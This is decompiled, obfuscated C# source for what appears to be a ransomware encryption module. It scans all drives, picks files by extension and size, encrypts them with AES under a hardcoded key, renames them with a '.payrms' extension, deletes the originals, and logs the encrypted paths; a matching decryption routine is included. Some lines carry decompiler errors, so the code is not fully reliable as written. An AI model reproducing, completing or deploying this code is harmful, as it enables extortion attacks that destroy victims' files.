using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;

namespace ns0;

internal static class Class7
{
	[CompilerGenerated]
	private sealed class Class9
	{
		public HashSet<string> hashSet_0;

		public Func<string, IEnumerable<string>> func_0;

		internal IEnumerable<string> method_0(string string_0)
		{
			return hashSet_0;
		}
	}

	private static readonly string string_0 = Delegate98.smethod_0(Class2.string_12, "EncryptedFileList.txt");

	private static readonly HashSet<string> hashSet_0 = Delegate229.smethod_0();

	private const string string_1 = ".payrms";

	private const string string_2 = "RgIhHj33JL9hnls0Poi3e5==";

	internal static void smethod_0()
	{
		HashSet<string> hashSet_ = Delegate134.smethod_0(smethod_3());
		IEnumerator<string> enumerator = Delegate118.smethod_0(from driveInfo_0 in Delegate163.smethod_0()
			select Delegate50.smethod_0(Delegate235.smethod_0(driveInfo_0)));
		try
		{
			while (Delegate194.smethod_0(enumerator))
			{
				smethod_5(Delegate189.smethod_0(enumerator), ".payrms", hashSet_);
			}
		}
		finally
		{
			if (enumerator != null)
			{
				Delegate73.smethod_0(enumerator);
			}
		}
		if (!Delegate156.smethod_0(string_0))
		{
			string[] array = hashSet_0.ToArray();
			Delegate178.smethod_0(string_0, array);
		}
	}

	internal static HashSet<string> smethod_1()
	{
		HashSet<string> hashSet = Delegate229.smethod_0();
		if (Delegate156.smethod_0(string_0))
		{
			string[] array = Delegate104.smethod_0(string_0);
			foreach (string text in array)
			{
				Delegate155.smethod_0(hashSet, text);
			}
		}
		return hashSet;
	}

	private static string smethod_2()
	{
		string result = Delegate98.smethod_0(Class2.string_12, "FileSystemSimulation");
		if (!Delegate231.smethod_0(result))
		{
			Delegate34.smethod_0(result);
		}
		TextWriter textWriter = Delegate228.smethod_0(Delegate98.smethod_0(result, "TxtTest.txt"), bool_0: true);
		try
		{
			Delegate57.smethod_0(textWriter, "I am a txt test.");
		}
		finally
		{
			if (textWriter != null)
			{
				Delegate73.smethod_0(textWriter);
			}
		}
		TextWriter textWriter2 = Delegate228.smethod_0(Delegate98.smethod_0(result, "NotTxtTest.nottxt"), bool_0: true);
		try
		{
			Delegate57.smethod_0(textWriter2, "I am NOT a txt test.");
			return result;
		}
		finally
		{
			if (textWriter2 != null)
			{
				Delegate73.smethod_0(textWriter2);
			}
		}
	}

	private static IEnumerable<string> smethod_3()
	{
		HashSet<string> hashSet = Delegate229.smethod_0();
		List<string>.Enumerator enumerator_ = Delegate207.smethod_0(Delegate51.smethod_0(Class12.ExtensionsToEncrypt, new string[2]
		{
			Delegate202.smethod_0(),
			" "
		}, StringSplitOptions.RemoveEmptyEntries).ToList());
		try
		{
			while (Delegate165.smethod_0(ref enumerator_))
			{
				string object_ = Delegate241.smethod_0(ref enumerator_);
				Delegate155.smethod_0(hashSet, Delegate18.smethod_0(object_));
			}
		}
		finally
		{
			((IDisposable)enumerator_).Dispose();
		}
		Delegate56.smethod_0(hashSet, ".payrms");
		return hashSet;
	}

	private static IEnumerable<string> smethod_4(string string_3)
	{
		Queue<string> object_ = Delegate11.smethod_0();
		Delegate201.smethod_0(object_, string_3);
		while (Delegate41.smethod_0(object_) > 0)
		{
			string_3 = Delegate13.smethod_0(object_);
			try
			{
				string[] array = Delegate33.smethod_0(string_3);
				foreach (string text in array)
				{
					Delegate201.smethod_0(object_, text);
				}
			}
			catch (Exception object_2)
			{
				Delegate111.smethod_0(Delegate119.smethod_0(), object_2);
			}
			string[] array2 = null;
			try
			{
				array2 = Delegate78.smethod_0(string_3);
			}
			catch (Exception object_3)
			{
				Delegate111.smethod_0(Delegate119.smethod_0(), object_3);
			}
			if (array2 != null)
			{
				string[] array3 = array2;
				for (int j = 0; j < array3.Length; j++)
				{
					yield return array3[j];
				}
			}
		}
	}

	private static void smethod_5(string string_3, string string_4, HashSet<string> hashSet_1)
	{
		IEnumerator<string> enumerator = Delegate118.smethod_0(from string_0 in smethod_4(string_3)
			from string_1 in hashSet_1
			select new Class0<string, string>(string_0, string_1) into class0_0
			where Delegate28.smethod_0(class0_0.file, class0_0.ext)
			select class0_0.file into string_0
			select new Class1<string, FileInfo>(string_0, Delegate166.smethod_0(string_0)) into class1_0
			where Delegate22.smethod_0(class1_0.fi) < 10000000
			select class1_0.file);
		try
		{
			while (Delegate194.smethod_0(enumerator))
			{
				string string_5 = Delegate189.smethod_0(enumerator);
				try
				{
					if (smethod_7(string_5, string_4))
					{
						Delegate155.smethod_0(hashSet_0, string_5);
					}
				}
				catch
				{
				}
			}
		}
		finally
		{
			if (enumerator != null)
			{
				Delegate73.smethod_0(enumerator);
			}
		}
	}

	internal static void smethod_6(string string_3)
	{
		HashSet<string>.Enumerator enumerator_ = Delegate80.smethod_0(smethod_1());
		try
		{
			while (Delegate181.smethod_0(ref enumerator_))
			{
				string text = Delegate103.smethod_0(ref enumerator_);
				try
				{
					string string_4 = Delegate127.smethod_0(text, string_3);
					smethod_8(string_4, string_3);
					Delegate162.smethod_0(string_4);
				}
				catch
				{
				}
			}
		}
		finally
		{
			((IDisposable)enumerator_).Dispose();
		}
		Delegate162.smethod_0(string_0);
	}

	private static bool smethod_7(string string_3, string string_4)
	{
		try
		{
			if (Class2.enum0_0 != 0 && (Delegate193.smethod_0(string_3, Class2.string_12, StringComparison.InvariantCulture) || Delegate193.smethod_0(string_3, "C:\\Windows", StringComparison.InvariantCultureIgnoreCase)))
			{
				return false;
			}
			AesCryptoServiceProvider aesCryptoServiceProvider = Delegate227.smethod_0();
			try
			{
				Delegate154.smethod_0(aesCryptoServiceProvider, Delegate224.smethod_0("RgIhHj33JL9hnls0Poi3e5=="));
				byte[] array = new byte[16];
				Delegate238.smethod_0(array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
				Delegate239.smethod_0(aesCryptoServiceProvider, array);
				smethod_9(aesCryptoServiceProvider, string_3, Delegate127.smethod_0(string_3, string_4));
			}
			finally
			{
				if (aesCryptoServiceProvider != null)
				{
					Delegate73.smethod_0(aesCryptoServiceProvider);
				}
			}
		}
		catch
		{
			return false;
		}
		try
		{
			Delegate162.smethod_0(string_3);
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}

	private static void smethod_8(string string_3, string string_4)
	{
		try
		{
			if (!Delegate28.smethod_0(string_3, string_4))
			{
				return;
			}
			string string_5 = Delegate92.smethod_0(string_3, Delegate198.smethod_0(string_3) - 4);
			AesCryptoServiceProvider aesCryptoServiceProvider = Delegate227.smethod_0();
			try
			{
				Delegate154.smethod_0(aesCryptoServiceProvider, Delegate224.smethod_0("RgIhHj33JL9hnls0Poi3e5=="));
				byte[] array = new byte[16];
				Delegate238.smethod_0(array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
				Delegate239.smethod_0(aesCryptoServiceProvider, array);
				smethod_10(aesCryptoServiceProvider, string_3, string_5);
			}
			finally
			{
				if (aesCryptoServiceProvider != null)
				{
					Delegate73.smethod_0(aesCryptoServiceProvider);
				}
			}
		}
		catch
		{
			return;
		}
		try
		{
			Delegate162.smethod_0(string_3);
		}
		catch (Exception)
		{
		}
	}

	private static void smethod_9(SymmetricAlgorithm symmetricAlgorithm_0, string string_3, string string_4)
	{
		byte[] array = new byte[65536];
		FileStream fileStream = Delegate85.smethod_0(string_3, FileMode.Open);
		try
		{
			FileStream fileStream2 = Delegate85.smethod_0(string_4, FileMode.Create);
			try
			{
				CryptoStream cryptoStream = Delegate112.smethod_0(fileStream2, Delegate29.smethod_0(symmetricAlgorithm_0), CryptoStreamMode.Write);
				try
				{
					int num;
					do
					{
						num = Delegate76.smethod_0(fileStream, array, 0, array.Length);
						if (num != 0)
						{
							Delegate179.smethod_0(cryptoStream, array, 0, num);
						}
					}
					while (num != 0);
				}
				finally
				{
					if (cryptoStream != null)
					{
						Delegate73.smethod_0(cryptoStream);
					}
				}
			}
			finally
			{
				if (fileStream2 != null)
				{
					Delegate73.smethod_0(fileStream2);
				}
			}
		}
		finally
		{
			if (fileStream != null)
			{
				Delegate73.smethod_0(fileStream);
			}
		}
	}

	private static void smethod_10(SymmetricAlgorithm symmetricAlgorithm_0, string string_3, string string_4)
	{
		byte[] array = new byte[65536];
		FileStream fileStream = Delegate85.smethod_0(string_3, FileMode.Open);
		try
		{
			FileStream fileStream2 = Delegate85.smethod_0(string_4, FileMode.Create);
			try
			{
				CryptoStream cryptoStream = Delegate112.smethod_0(fileStream2, Delegate46.smethod_0(symmetricAlgorithm_0), CryptoStreamMode.Write);
				try
				{
					int num;
					do
					{
						num = Delegate76.smethod_0(fileStream, array, 0, array.Length);
						if (num != 0)
						{
							Delegate179.smethod_0(cryptoStream, array, 0, num);
						}
					}
					while (num != 0);
				}
				finally
				{
					if (cryptoStream != null)
					{
						Delegate73.smethod_0(cryptoStream);
					}
				}
			}
			finally
			{
				if (fileStream2 != null)
				{
					Delegate73.smethod_0(fileStream2);
				}
			}
		}
		finally
		{
			if (fileStream != null)
			{
				Delegate73.smethod_0(fileStream);
			}
		}
	}
}
